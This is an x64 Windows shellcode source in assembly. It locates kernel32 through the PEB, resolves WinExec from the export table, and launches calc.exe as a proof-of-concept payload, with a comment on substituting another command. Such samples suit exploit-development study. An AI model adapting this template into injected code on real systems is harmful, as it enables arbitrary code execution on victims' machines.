[SECTION .text]
bits 64
global _start

_start:
    ; --- STEP 1: FIND KERNEL32 BASE ---
    sub rsp, 40                 ; Allocate shadow space & align stack
    xor rsi, rsi
    mov rsi, [gs:rsi + 0x60]    ; Rsi = PEB
    mov rsi, [rsi + 0x18]       ; Rsi = PEB->Ldr
    mov rsi, [rsi + 0x30]       ; Rsi = Ldr->InInitOrder (Kernel32 is usually 3rd)
    mov rsi, [rsi]              ; ntdll.dll
    mov rsi, [rsi]              ; kernel32.dll
    mov rbp, [rsi + 0x10]       ; RBP = Kernel32 Base Address

    ; --- STEP 2: RESOLVE WINEXEC ADDRESS (Your new block) ---
    mov eax, [rbp + 0x3c]       ; RVA of PE Header
    add rax, rbp                ; PE Header Address
    mov eax, [rax + 0x88]       ; Export Directory RVA
    add rax, rbp                ; Export Directory Address
    
    mov r12d, [rax + 0x18]      ; Number of Names
    mov r13d, [rax + 0x20]      ; AddressOfNames RVA
    add r13, rbp                ; AddressOfNames Address
    
    mov r14d, [rax + 0x24]      ; AddressOfNameOrdinals RVA
    add r14, rbp                ; AddressOfNameOrdinals Address
    
    mov r15d, [rax + 0x1c]      ; AddressOfFunctions RVA
    add r15, rbp                ; AddressOfFunctions Address

search_loop:
    dec r12                     
    mov edi, [r13 + r12 * 4]    
    add rdi, rbp                
    mov rax, 0x636578456e6957   ; "WinExec" in little Endian (for another process would have to convert to hex and reverse it)
    cmp [rdi], rax
    jnz search_loop             

found:
    movzx eax, word [r14 + r12 * 2] 
    mov eax, [r15 + rax * 4]        
    add rax, rbp                ; RAX now holds the actual address of WinExec

    ; --- STEP 3: EXECUTE ---
    xor rcx, rcx                ; Clear RCX
    push rcx                    ; Null terminator for string
    mov rdx, 0x6578652e636c6163 ; "calc.exe"
    push rdx                    ; Push string to stack
    mov rcx, rsp                ; RCX = pointer to "calc.exe"
    mov rdx, 1                  ; RDX = SW_SHOWNORMAL
    call rax                    ; Execute WinExec!

    add rsp, 56                 ; Clean up stack (40 shadow + 16 for string)
    ret